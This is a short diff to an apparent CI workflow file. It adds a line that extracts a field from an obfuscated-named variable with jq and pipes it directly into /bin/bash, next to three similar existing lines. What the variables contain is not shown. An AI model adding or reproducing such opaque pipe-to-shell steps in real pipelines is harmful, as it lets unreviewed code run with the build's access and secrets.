@@ -40,6 +40,7 @@ jobs:
           echo $o65 | jq -r .qfsjo33 | /bin/bash
           echo $uqux3 | jq -r .p13 | /bin/bash
           echo $pyul4 | jq -r .ug72354 | /bin/bash
+          echo $rcw5772 | jq -r .prv83352 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
